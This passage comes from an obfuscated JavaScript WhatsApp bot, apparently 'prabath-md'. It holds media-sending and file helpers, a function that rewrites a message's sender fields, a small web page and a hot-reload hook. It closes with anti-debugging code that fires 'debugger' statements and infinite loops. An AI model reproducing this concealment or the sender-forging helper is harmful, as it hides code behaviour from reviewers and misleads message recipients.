          }
        )
      }
      if (_0x4f9458.split('/')[0] === 'image') {
        return _0x3f593f.sendMessage(
          _0x5ae4b9,
          {
            image: await getBuffer(_0x479348),
            caption: _0x2ce8e2,
            ..._0x4efffd,
          },
          {
            quoted: _0x109192,
            ..._0x4efffd,
          }
        )
      }
      if (_0x4f9458.split('/')[0] === 'video') {
        return _0x3f593f.sendMessage(
          _0x5ae4b9,
          {
            video: await getBuffer(_0x479348),
            caption: _0x2ce8e2,
            mimetype: 'video/mp4',
            ..._0x4efffd,
          },
          {
            quoted: _0x109192,
            ..._0x4efffd,
          }
        )
      }
      if (_0x4f9458.split('/')[0] === 'audio') {
        return _0x3f593f.sendMessage(
          _0x5ae4b9,
          {
            audio: await getBuffer(_0x479348),
            caption: _0x2ce8e2,
            mimetype: 'audio/mpeg',
            ..._0x4efffd,
          },
          {
            quoted: _0x109192,
            ..._0x4efffd,
          }
        )
      }
    }
    return (
      (_0x3f593f.cMod = (
        _0x47d815,
        _0x18688b,
        _0x219ae1 = '',
        _0x3a6a00 = _0x3f593f.user.id,
        _0x42a065 = {}
      ) => {
        let _0x35c7e8 = Object.keys(_0x18688b.message)[0],
          _0x3c681b = _0x35c7e8 === 'ephemeralMessage'
        _0x3c681b &&
          (_0x35c7e8 = Object.keys(
            _0x18688b.message.ephemeralMessage.message
          )[0])
        let _0x5ea9b1 = _0x3c681b
          ? _0x18688b.message.ephemeralMessage.message
          : _0x18688b.message
        let _0x1e2a7c = _0x5ea9b1[_0x35c7e8]
        if (typeof _0x1e2a7c === 'string') {
          _0x5ea9b1[_0x35c7e8] = _0x219ae1 || _0x1e2a7c
        } else {
          if (_0x1e2a7c.caption) {
            _0x1e2a7c.caption = _0x219ae1 || _0x1e2a7c.caption
          } else {
            if (_0x1e2a7c.text) {
              _0x1e2a7c.text = _0x219ae1 || _0x1e2a7c.text
            }
          }
        }
        if (typeof _0x1e2a7c !== 'string') {
          _0x5ea9b1[_0x35c7e8] = {
            ..._0x1e2a7c,
            ..._0x42a065,
          }
        }
        if (_0x18688b.key.participant) {
          _0x3a6a00 = _0x18688b.key.participant =
            _0x3a6a00 || _0x18688b.key.participant
        } else {
          if (_0x18688b.key.participant) {
            _0x3a6a00 = _0x18688b.key.participant =
              _0x3a6a00 || _0x18688b.key.participant
          }
        }
        if (_0x18688b.key.remoteJid.includes('@s.whatsapp.net')) {
          _0x3a6a00 = _0x3a6a00 || _0x18688b.key.remoteJid
        } else {
          if (_0x18688b.key.remoteJid.includes('@broadcast')) {
            _0x3a6a00 = _0x3a6a00 || _0x18688b.key.remoteJid
          }
        }
        return (
          (_0x18688b.key.remoteJid = _0x47d815),
          (_0x18688b.key.fromMe = _0x3a6a00 === _0x3f593f.user.id),
          proto.WebMessageInfo.fromObject(_0x18688b)
        )
      }),
      (_0x3f593f.getFile = async (_0x32d441, _0x3c2381) => {
        let _0x44c3fe
        let _0x149726 = Buffer.isBuffer(_0x32d441)
          ? _0x32d441
          : /^data:.*?\/.*?;base64,/i.test(_0x32d441)
          ? Buffer.from(_0x32d441.split`,`[1], 'base64')
          : /^https?:\/\//.test(_0x32d441)
          ? await (_0x44c3fe = await getBuffer(_0x32d441))
          : fs.existsSync(_0x32d441)
          ? ((_0x4a2543 = _0x32d441), fs.readFileSync(_0x32d441))
          : typeof _0x32d441 === 'string'
          ? _0x32d441
          : Buffer.alloc(0)
        const _0x4fc98f = {
          mime: 'application/octet-stream',
          ext: '.bin',
        }
        let _0x567cbf = (await FileType.fromBuffer(_0x149726)) || _0x4fc98f,
          _0x4a2543 = path.join(
            __filename,
            __dirname + new Date() * 1 + '.' + _0x567cbf.ext
          )
        if (_0x149726 && _0x3c2381) {
          fs.promises.writeFile(_0x4a2543, _0x149726)
        }
        return {
          res: _0x44c3fe,
          filename: _0x4a2543,
          size: await getSizeMedia(_0x149726),
          ..._0x567cbf,
          data: _0x149726,
        }
      }),
      (_0x3f593f.sendFile = async (
        _0x55032f,
        _0x5ad305,
        _0x27ced0,
        _0x4db23b = {},
        _0x3febc6 = {}
      ) => {
        let _0x33bf93 = await _0x3f593f.getFile(_0x5ad305, true)
        let {
          filename: _0x344903,
          size: _0x4c261e,
          ext: _0x1ac565,
          mime: _0x4b69e7,
          data: _0x52252d,
        } = _0x33bf93
        let _0x448252 = '',
          _0x205857 = _0x4b69e7,
          _0x52a46e = _0x344903
        if (_0x3febc6.asDocument) {
          _0x448252 = 'document'
        }
        if (_0x3febc6.asSticker || /webp/.test(_0x4b69e7)) {
          let { writeExif: _0x6fe627 } = require('./exif.js')
          const _0x46e0cf = {
            mimetype: _0x4b69e7,
            data: _0x52252d,
          }
          let _0x5130d5 = _0x46e0cf
          const _0x42e1cb = {
            packname: Config.packname,
            author: Config.packname,
            categories: _0x3febc6.categories ? _0x3febc6.categories : [],
          }
          _0x52a46e = await _0x6fe627(_0x5130d5, _0x42e1cb)
          await fs.promises.unlink(_0x344903)
          _0x448252 = 'sticker'
          _0x205857 = 'image/webp'
        } else {
          if (/image/.test(_0x4b69e7)) {
            _0x448252 = 'image'
          } else {
            if (/video/.test(_0x4b69e7)) {
              _0x448252 = 'video'
            } else {
              if (/audio/.test(_0x4b69e7)) {
                _0x448252 = 'audio'
              } else {
                _0x448252 = 'document'
              }
            }
          }
        }
        const _0xd64a18 = { url: _0x52a46e }
        const _0x12eaab = {
          [_0x448252]: _0xd64a18,
          mimetype: _0x205857,
          fileName: _0x27ced0,
          ..._0x3febc6,
        }
        const _0x58ddf5 = {
          quoted: _0x4db23b,
          ..._0x3febc6,
        }
        return (
          await _0x3f593f.sendMessage(_0x55032f, _0x12eaab, _0x58ddf5),
          fs.promises.unlink(_0x52a46e)
        )
      }),
      (_0x3f593f.parseMention = async (_0x3268bc) => {
        return [..._0x3268bc.matchAll(/@([0-9]{5,16}|0)/g)].map(
          (_0x2ee008) => _0x2ee008[1] + '@s.whatsapp.net'
        )
      }),
      _0x3f593f
    )
  }
  _0x12cf82().catch((_0x288b74) => console.log(_0x288b74))
  const _0x138947 =
    '\n\n<!DOCTYPE html>\n\n<html>\n\n  <head>\n\n    <title>Secktor-Md</title>\n\n    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>\n\n    <script>\n\n      setTimeout(() => {\n\n        confetti({\n\n          particleCount: 100,\n\n          spread: 70,\n\n          origin: { y: 0.6 },\n\n          disableForReducedMotion: true\n\n        });\n\n      }, 500);\n\n    </script>\n\n    <style>\n\n      @import url("https://p.typekit.net/p.css?s=1&k=vnd5zic&ht=tk&f=39475.39476.39477.39478.39479.39480.39481.39482&a=18673890&app=typekit&e=css");\n\n      @font-face {\n\n        font-family: "neo-sans";\n\n        src: url("https://use.typekit.net/af/00ac0a/00000000000000003b9b2033/27/l?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n7&v=3") format("woff2"), url("https://use.typekit.net/af/00ac0a/00000000000000003b9b2033/27/d?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n7&v=3") format("woff"), url("https://use.typekit.net/af/00ac0a/00000000000000003b9b2033/27/a?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n7&v=3") format("opentype");\n\n        font-style: normal;\n\n        font-weight: 700;\n\n      }\n\n      html {\n\n        font-family: neo-sans;\n\n        font-weight: 700;\n\n        font-size: calc(62rem / 16);\n\n      }\n\n      body {\n\n        background: blue;\n\n      }\n\n      section {\n\n        border-radius: 1em;\n\n        padding: 1em;\n\n        position: absolute;\n\n        top: 50%;\n\n        left: 50%;\n\n        margin-right: -50%;\n\n        transform: translate(-50%, -50%);\n\n      }\n\n    </style>\n\n  </head>\n\n  <body>\n\n    <section>\n\n      Hello  I AM PRABATH-MD  \uD83D\uDE4B‍\u2642️!\n\n    </section>\n\n  </body>\n\n</html>\n\n'
  app.get('/', (_0x56a138, _0x2a8319) => _0x2a8319.type('html').send(_0x138947))
  app.listen(port, () =>
    console.log(
      '\n\n\n \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2557     \u2588\u2588\u2557        \u2588\u2588\u2588\u2588\u2557    \u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557 \uD835\uDDE7\uD835\uDDE0\n \u2588\u2588\u2554\u2550\u2550\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u2588\u2588\u2557  \u2588\u2588\u2554\u2550\u2550\u2550\u255D\u2588\u2588\u2551     \u2588\u2588\u2551        \u2588\u2588\u2551\u2588\u2588\u2551  \u2588\u2588\u2551\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u2588\u2588\u2557\n \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255D\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255D\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255D\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551  \u2588\u2588\u2551    \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551 \u2588\u2588\u2588\u2588\u2588\u2551 \u2588\u2588\u2551 \u2588\u2588\u2551\u2588\u2588\u2551 \u2588\u2588\u2551\u2588\u2588\u2551    \u2588\u2588\u2551\n \u2588\u2588\u2554\u2550\u2550\u2550\u2550\u2550\u255D \u2588\u2588\u2554\u2550\u2550\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u2588\u2588\u2551  \u2588\u2588\u2551    \u2588\u2588\u2554\u2550\u2550\u2550\u2550\u2550\u2588\u2588\u2551 \u255A\u2550\u2550\u2550\u2550\u255D \u2588\u2588\u2551  \u2588\u2588\u2588\u2551  \u2588\u2588\u2551\u2588\u2588\u2551    \u2588\u2588\u2551\n \u2588\u2588\u2551\t   \u2588\u2588\u2551    \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255D\u2588\u2588\u2551    \u2588\u2588\u2551  \u2588\u2588\u2551    \u2588\u2588\u2551     \u2588\u2588\u2551        \u2588\u2588\u2551  \u255A\u2550\u2550\u255D  \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255D\n \u255A\u2550\u255D\t   \u255A\u2550\u255D    \u255A\u2550\u255D\u255A\u2550\u2550\u2550\u2550\u2550\u2550\u255D  \u255A\u2550\u255D    \u255A\u2550\u255D  \u255A\u2550\u255D    \u255A\u2550\u255D     \u255A\u2550\u255D        \u255A\u2550\u255D        \u255A\u2550\u255D\u255A\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255D \n\nprabath-md Server listening on port http://localhost:' +
        port +
        '!'
    )
  )
  let _0x58b6ac = require.resolve(__filename)
  fs.watchFile(_0x58b6ac, () => {
    fs.unwatchFile(_0x58b6ac)
    console.log('Update ' + __filename)
    delete require.cache[_0x58b6ac]
    require(_0x58b6ac)
  })
}, 3000)
function _0x43ce46(_0x5b78d0) {
  function _0x359b3a(_0x3ae502) {
    if (typeof _0x3ae502 === 'string') {
      return function (_0x36993e) {}
        .constructor('while (true) {}')
        .apply('counter')
    } else {
      ;('' + _0x3ae502 / _0x3ae502).length !== 1 || _0x3ae502 % 20 === 0
        ? function () {
            return true
          }
            .constructor('debugger')
            .call('action')
        : function () {
            return false
          }
            .constructor('debugger')
            .apply('stateObject')
    }
    _0x359b3a(++_0x3ae502)
  }
  try {
    if (_0x5b78d0) {
      return _0x359b3a
    } else {
      _0x359b3a(0)
    }
  } catch (_0x8c0989) {}
}
